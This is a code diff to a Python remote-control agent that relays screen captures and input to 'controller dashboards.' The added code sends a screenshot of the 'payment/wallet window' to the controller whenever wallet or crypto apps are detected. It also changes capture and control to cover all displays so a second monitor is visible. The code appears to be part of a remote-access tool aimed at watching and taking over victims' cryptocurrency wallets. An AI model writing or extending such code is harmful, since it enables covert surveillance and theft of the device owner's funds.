@@ -244,8 +244,19 @@ class Agent:
                     self.quality = max(10, min(95, int(msg["quality"])))
                 if "scale" in msg:
                     self.scale = max(0.15, min(1.0, float(msg["scale"])))
+                if "monitor" in msg:
+                    await asyncio.get_running_loop().run_in_executor(
+                        self._capture_pool, self._apply_monitor, int(msg["monitor"]))
             elif t == P.ERROR:
                 log.error(f"relay error: {msg.get('message')}")
+
+    def _apply_monitor(self, index: int):
+        """Must run on the capture worker (mss is thread-local)."""
+        self.cap.set_monitor(index)
+        self.injector.set_geometry(
+            self.cap.left, self.cap.top, self.cap.width, self.cap.height)
+        log.info(f"capture display index={self.cap.monitor_index} "
+                 f"{self.cap.width}x{self.cap.height} @ ({self.cap.left},{self.cap.top})")
 
     async def _watch_apps(self, ws):
         """Detect wallet/crypto apps and notify every connected controller dashboard."""
@@ -262,6 +273,14 @@ class Agent:
                 if m.key in seen:
                     continue
                 try:
+                    # Push a fresh screenshot so the controller sees the
+                    # payment/wallet window, including when it is on display 2.
+                    jpeg = await asyncio.get_running_loop().run_in_executor(
+                        self._capture_pool, self.cap.grab_jpeg,
+                        PREVIEW_QUALITY, PREVIEW_SCALE)
+                    if not self._peer_present and jpeg:
+                        self._latest_preview_jpeg = jpeg
+                        self._frame_ready.set()
                     await ws.send(P.dumps(P.alert(
                         m.label, m.detail,
                         device_id=self.device_id, device_name=self.name)))
@@ -290,7 +309,8 @@ def parse_args(arguments=None):
     ap.add_argument("--fps", type=int, default=DEFAULT_FPS)
     ap.add_argument("--quality", type=int, default=DEFAULT_QUALITY)
     ap.add_argument("--scale", type=float, default=DEFAULT_SCALE)
-    ap.add_argument("--monitor", type=int, default=1)
+    # 0 = all displays together (needed to see and control a second monitor).
+    ap.add_argument("--monitor", type=int, default=0)
     args = ap.parse_args(arguments)
     if not 1 <= args.fps <= 30:
         raise ValueError("FPS must be between 1 and 30.")
